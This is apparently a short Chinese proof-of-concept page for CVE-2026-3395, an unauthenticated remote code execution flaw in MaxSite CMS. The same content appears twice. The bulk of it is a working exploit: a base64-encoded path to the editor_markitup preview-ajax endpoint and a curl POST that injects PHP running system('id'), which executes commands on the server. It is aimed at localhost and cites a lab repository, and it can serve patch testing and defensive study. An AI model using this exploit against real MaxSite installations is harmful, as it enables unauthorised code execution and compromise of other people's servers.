## MaxSite CMS未授权RCE漏洞

## 介绍
CVE-2026-3395 漏洞会影响 MaxSite CMS，允许未经身份验证的用户访问管理 AJAX 端点。run_php启用该插件后，用户输入可以通过 CMS 钩子系统被解析为 PHP 代码，这可能导致远程代码执行 (RCE)。

## poc

#Base64编码:
admin/plugins/editor_markitup/preview-ajax.php
YWRtaW4vcGx1Z2lucy9lZGl0b3JfbWFya2l0dXAvcHJldmlldy1hamF4LnBocA==

curl -X POST "http://localhost:8081/ajax/YWRtaW4vcGx1Z2lucy9lZGl0b3JfbWFya2l0dXAvcHJldmlldy1hamF4LnBocA==" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://localhost:8081/" \
  --data-urlencode "data=[php]system('id');[/php]"

# MaxSite CMS未授权RCE漏洞

CVE-2026-3395 漏洞会影响 MaxSite CMS，允许未经身份验证的用户访问管理 AJAX 端点。run_php启用该插件后，用户输入可以通过 CMS 钩子系统被解析为 PHP 代码，这可能导致远程代码执行 (RCE)。

## poc
#Base64编码：
```
admin/plugins/editor_markitup/preview-ajax.php

YWRtaW4vcGx1Z2lucy9lZGl0b3JfbWFya2l0dXAvcHJldmlldy1hamF4LnBocA==
```

```
curl -X POST "http://localhost:8081/ajax/YWRtaW4vcGx1Z2lucy9lZGl0b3JfbWFya2l0dXAvcHJldmlldy1hamF4LnBocA==" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://localhost:8081/" \
  --data-urlencode "data=[php]system('id');[/php]"
```
## 漏洞来源

- https://github.com/rootdirective-sec/CVE-2026-3395-Lab
